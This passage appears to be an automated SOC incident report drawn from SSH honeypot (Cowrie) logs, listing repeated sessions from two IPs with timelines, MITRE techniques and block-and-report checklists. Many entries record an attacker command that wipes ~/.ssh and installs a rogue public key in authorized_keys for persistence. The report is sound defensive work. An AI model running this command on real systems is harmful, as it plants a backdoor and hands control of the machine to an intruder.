| `2026-06-08 20:32:48` | `cowrie.session.connect` |
| `2026-06-08 20:32:48` | `cowrie.client.version` |
| `2026-06-08 20:32:48` | `cowrie.client.kex` |
| `2026-06-08 20:32:49` | `cowrie.login.success` |
| `2026-06-08 20:32:50` | `cowrie.session.params` |
| `2026-06-08 20:32:50` | `cowrie.command.input` |
| `2026-06-08 20:32:50` | `cowrie.command.failed` |
| `2026-06-08 20:32:50` | `cowrie.log.closed` |
| `2026-06-08 20:32:51` | `cowrie.session.params` |
| `2026-06-08 20:32:51` | `cowrie.command.input` |
| `2026-06-08 20:32:51` | `cowrie.session.file_download` |
| `2026-06-08 20:32:51` | `cowrie.log.closed` |
| `2026-06-08 20:32:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.222.117[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.222.117[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e005def7cdb

| Field | Detail |
|---|---|
| **Source IP** | `35.222.117[.]243` |
| **First Seen** | 2026-06-08 20:32 |
| **Last Seen** | 2026-06-08 20:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:32:54` | `cowrie.session.connect` |
| `2026-06-08 20:32:54` | `cowrie.client.version` |
| `2026-06-08 20:32:54` | `cowrie.client.kex` |
| `2026-06-08 20:32:55` | `cowrie.login.success` |
| `2026-06-08 20:32:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.222.117[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.222.117[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af6f029cc4f8

| Field | Detail |
|---|---|
| **Source IP** | `120.48.77[.]176` |
| **First Seen** | 2026-06-08 20:33 |
| **Last Seen** | 2026-06-08 20:33 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:33:15` | `cowrie.session.connect` |
| `2026-06-08 20:33:18` | `cowrie.client.version` |
| `2026-06-08 20:33:18` | `cowrie.client.kex` |
| `2026-06-08 20:33:18` | `cowrie.login.success` |
| `2026-06-08 20:33:19` | `cowrie.session.params` |
| `2026-06-08 20:33:19` | `cowrie.command.input` |
| `2026-06-08 20:33:19` | `cowrie.command.failed` |
| `2026-06-08 20:33:19` | `cowrie.log.closed` |
| `2026-06-08 20:33:19` | `cowrie.session.params` |
| `2026-06-08 20:33:19` | `cowrie.command.input` |
| `2026-06-08 20:33:20` | `cowrie.session.file_download` |
| `2026-06-08 20:33:20` | `cowrie.log.closed` |
| `2026-06-08 20:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.77[.]176` to AbuseIPDB if not already reported
- [ ] Block `120.48.77[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-719000ef460f

| Field | Detail |
|---|---|
| **Source IP** | `120.48.77[.]176` |
| **First Seen** | 2026-06-08 20:33 |
| **Last Seen** | 2026-06-08 20:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:33:28` | `cowrie.session.connect` |
| `2026-06-08 20:33:28` | `cowrie.client.version` |
| `2026-06-08 20:33:29` | `cowrie.client.kex` |
| `2026-06-08 20:33:29` | `cowrie.login.success` |
| `2026-06-08 20:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.77[.]176` to AbuseIPDB if not already reported
- [ ] Block `120.48.77[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-072acfa06e2c

| Field | Detail |
|---|---|
| **Source IP** | `35.222.117[.]243` |
| **First Seen** | 2026-06-08 20:35 |
| **Last Seen** | 2026-06-08 20:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:35:24` | `cowrie.session.connect` |
| `2026-06-08 20:35:24` | `cowrie.client.version` |
| `2026-06-08 20:35:24` | `cowrie.client.kex` |
| `2026-06-08 20:35:25` | `cowrie.login.success` |
| `2026-06-08 20:35:26` | `cowrie.session.params` |
| `2026-06-08 20:35:26` | `cowrie.command.input` |
| `2026-06-08 20:35:26` | `cowrie.command.failed` |
| `2026-06-08 20:35:26` | `cowrie.log.closed` |
| `2026-06-08 20:35:27` | `cowrie.session.params` |
| `2026-06-08 20:35:27` | `cowrie.command.input` |
| `2026-06-08 20:35:27` | `cowrie.session.file_download` |
| `2026-06-08 20:35:27` | `cowrie.log.closed` |
| `2026-06-08 20:35:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.222.117[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.222.117[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23682b452f6f

| Field | Detail |
|---|---|
| **Source IP** | `35.222.117[.]243` |
| **First Seen** | 2026-06-08 20:35 |
| **Last Seen** | 2026-06-08 20:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:35:30` | `cowrie.session.connect` |
| `2026-06-08 20:35:30` | `cowrie.client.version` |
| `2026-06-08 20:35:30` | `cowrie.client.kex` |
| `2026-06-08 20:35:31` | `cowrie.login.success` |
| `2026-06-08 20:35:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.222.117[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.222.117[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5b6ee1cede9

| Field | Detail |
|---|---|
| **Source IP** | `35.222.117[.]243` |
| **First Seen** | 2026-06-08 20:41 |
| **Last Seen** | 2026-06-08 20:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:41:26` | `cowrie.session.connect` |
| `2026-06-08 20:41:26` | `cowrie.client.version` |
| `2026-06-08 20:41:26` | `cowrie.client.kex` |
| `2026-06-08 20:41:27` | `cowrie.login.success` |
| `2026-06-08 20:41:28` | `cowrie.session.params` |
| `2026-06-08 20:41:28` | `cowrie.command.input` |
| `2026-06-08 20:41:28` | `cowrie.command.failed` |
| `2026-06-08 20:41:28` | `cowrie.log.closed` |
| `2026-06-08 20:41:29` | `cowrie.session.params` |
| `2026-06-08 20:41:29` | `cowrie.command.input` |
| `2026-06-08 20:41:29` | `cowrie.session.file_download` |
| `2026-06-08 20:41:29` | `cowrie.log.closed` |
| `2026-06-08 20:41:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.222.117[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.222.117[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c1fd5061650

| Field | Detail |
|---|---|
| **Source IP** | `35.222.117[.]243` |
| **First Seen** | 2026-06-08 20:41 |
| **Last Seen** | 2026-06-08 20:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:41:33` | `cowrie.session.connect` |
| `2026-06-08 20:41:33` | `cowrie.client.version` |
| `2026-06-08 20:41:33` | `cowrie.client.kex` |
| `2026-06-08 20:41:34` | `cowrie.login.success` |
| `2026-06-08 20:41:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.222.117[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.222.117[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04fcf92f8898

| Field | Detail |
|---|---|
| **Source IP** | `35.222.117[.]243` |
| **First Seen** | 2026-06-08 20:45 |
| **Last Seen** | 2026-06-08 20:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:45:00` | `cowrie.session.connect` |
| `2026-06-08 20:45:00` | `cowrie.client.version` |
| `2026-06-08 20:45:01` | `cowrie.client.kex` |
| `2026-06-08 20:45:02` | `cowrie.login.success` |
| `2026-06-08 20:45:03` | `cowrie.session.params` |
| `2026-06-08 20:45:03` | `cowrie.command.input` |
| `2026-06-08 20:45:03` | `cowrie.command.failed` |
| `2026-06-08 20:45:03` | `cowrie.log.closed` |
| `2026-06-08 20:45:04` | `cowrie.session.params` |
| `2026-06-08 20:45:04` | `cowrie.command.input` |
| `2026-06-08 20:45:04` | `cowrie.session.file_download` |
| `2026-06-08 20:45:04` | `cowrie.log.closed` |
| `2026-06-08 20:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.222.117[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.222.117[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c54cd228fed6

| Field | Detail |
|---|---|
| **Source IP** | `35.222.117[.]243` |
| **First Seen** | 2026-06-08 20:45 |
| **Last Seen** | 2026-06-08 20:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:45:07` | `cowrie.session.connect` |
| `2026-06-08 20:45:07` | `cowrie.client.version` |
| `2026-06-08 20:45:07` | `cowrie.client.kex` |
| `2026-06-08 20:45:08` | `cowrie.login.success` |
| `2026-06-08 20:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.222.117[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.222.117[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3246f2ba7b87

| Field | Detail |
|---|---|
| **Source IP** | `35.222.117[.]243` |
| **First Seen** | 2026-06-08 20:47 |
| **Last Seen** | 2026-06-08 20:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:47:27` | `cowrie.session.connect` |
| `2026-06-08 20:47:27` | `cowrie.client.version` |
| `2026-06-08 20:47:27` | `cowrie.client.kex` |
| `2026-06-08 20:47:28` | `cowrie.login.success` |
| `2026-06-08 20:47:29` | `cowrie.session.params` |
| `2026-06-08 20:47:29` | `cowrie.command.input` |
| `2026-06-08 20:47:29` | `cowrie.command.failed` |
| `2026-06-08 20:47:29` | `cowrie.log.closed` |
| `2026-06-08 20:47:30` | `cowrie.session.params` |
| `2026-06-08 20:47:30` | `cowrie.command.input` |
| `2026-06-08 20:47:30` | `cowrie.session.file_download` |
| `2026-06-08 20:47:30` | `cowrie.log.closed` |
| `2026-06-08 20:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.222.117[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.222.117[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63689d114a5f

| Field | Detail |
|---|---|
| **Source IP** | `35.222.117[.]243` |
| **First Seen** | 2026-06-08 20:47 |
| **Last Seen** | 2026-06-08 20:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:47:33` | `cowrie.session.connect` |
| `2026-06-08 20:47:33` | `cowrie.client.version` |
| `2026-06-08 20:47:34` | `cowrie.client.kex` |
| `2026-06-08 20:47:35` | `cowrie.login.success` |
| `2026-06-08 20:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.222.117[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.222.117[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec1608dff0d6

| Field | Detail |
|---|---|
| **Source IP** | `120.48.77[.]176` |
| **First Seen** | 2026-06-08 20:51 |
| **Last Seen** | 2026-06-08 20:51 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:51:04` | `cowrie.session.connect` |
| `2026-06-08 20:51:05` | `cowrie.client.version` |
| `2026-06-08 20:51:05` | `cowrie.client.kex` |
| `2026-06-08 20:51:07` | `cowrie.login.success` |
| `2026-06-08 20:51:11` | `cowrie.session.params` |
| `2026-06-08 20:51:11` | `cowrie.command.input` |
| `2026-06-08 20:51:11` | `cowrie.command.failed` |
| `2026-06-08 20:51:11` | `cowrie.log.closed` |
| `2026-06-08 20:51:11` | `cowrie.session.params` |
| `2026-06-08 20:51:11` | `cowrie.command.input` |
| `2026-06-08 20:51:12` | `cowrie.session.file_download` |
| `2026-06-08 20:51:12` | `cowrie.log.closed` |
| `2026-06-08 20:51:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.77[.]176` to AbuseIPDB if not already reported
- [ ] Block `120.48.77[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f785531f776

| Field | Detail |
|---|---|
| **Source IP** | `35.222.117[.]243` |
| **First Seen** | 2026-06-08 20:51 |
| **Last Seen** | 2026-06-08 20:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:51:11` | `cowrie.session.connect` |
| `2026-06-08 20:51:11` | `cowrie.client.version` |
| `2026-06-08 20:51:12` | `cowrie.client.kex` |
| `2026-06-08 20:51:12` | `cowrie.login.success` |
| `2026-06-08 20:51:13` | `cowrie.session.params` |
| `2026-06-08 20:51:13` | `cowrie.command.input` |
| `2026-06-08 20:51:13` | `cowrie.command.failed` |
| `2026-06-08 20:51:13` | `cowrie.log.closed` |
| `2026-06-08 20:51:14` | `cowrie.session.params` |
| `2026-06-08 20:51:14` | `cowrie.command.input` |
| `2026-06-08 20:51:14` | `cowrie.session.file_download` |
| `2026-06-08 20:51:14` | `cowrie.log.closed` |
| `2026-06-08 20:51:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.222.117[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.222.117[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96177f57b445

| Field | Detail |
|---|---|
| **Source IP** | `35.222.117[.]243` |
| **First Seen** | 2026-06-08 20:51 |
| **Last Seen** | 2026-06-08 20:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:51:18` | `cowrie.session.connect` |
| `2026-06-08 20:51:18` | `cowrie.client.version` |
| `2026-06-08 20:51:18` | `cowrie.client.kex` |
| `2026-06-08 20:51:19` | `cowrie.login.success` |
| `2026-06-08 20:51:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.222.117[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.222.117[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbc85427b1a0

| Field | Detail |
|---|---|
| **Source IP** | `120.48.77[.]176` |
| **First Seen** | 2026-06-08 20:51 |
| **Last Seen** | 2026-06-08 20:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:51:20` | `cowrie.session.connect` |
| `2026-06-08 20:51:20` | `cowrie.client.version` |
| `2026-06-08 20:51:20` | `cowrie.client.kex` |
| `2026-06-08 20:51:21` | `cowrie.login.success` |
| `2026-06-08 20:51:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.77[.]176` to AbuseIPDB if not already reported
- [ ] Block `120.48.77[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12f83c8ec8dd

| Field | Detail |
|---|---|
| **Source IP** | `35.222.117[.]243` |
| **First Seen** | 2026-06-08 20:56 |
| **Last Seen** | 2026-06-08 20:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:56:04` | `cowrie.session.connect` |
| `2026-06-08 20:56:04` | `cowrie.client.version` |
| `2026-06-08 20:56:04` | `cowrie.client.kex` |
| `2026-06-08 20:56:05` | `cowrie.login.success` |
| `2026-06-08 20:56:06` | `cowrie.session.params` |
| `2026-06-08 20:56:06` | `cowrie.command.input` |
| `2026-06-08 20:56:06` | `cowrie.command.failed` |
| `2026-06-08 20:56:06` | `cowrie.log.closed` |
| `2026-06-08 20:56:07` | `cowrie.session.params` |
| `2026-06-08 20:56:07` | `cowrie.command.input` |
| `2026-06-08 20:56:07` | `cowrie.session.file_download` |
| `2026-06-08 20:56:07` | `cowrie.log.closed` |
| `2026-06-08 20:56:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.222.117[.]243` to AbuseIPDB if not already reported
- [ ] Block `35.222.117[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a79faf9aaf28

| Field | Detail |
|---|---|
| **Source IP** | `35.222.117[.]243` |
| **First Seen** | 2026-06-08 20:56 |
| **Last Seen** | 2026-06-08 20:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 20:56:10` | `cowrie.session.connect` |
| `2026-06-08 20:56:10` | `cowrie.client.version` |
| `2026-06-08 20:56:10` | `cowrie.client.kex` |
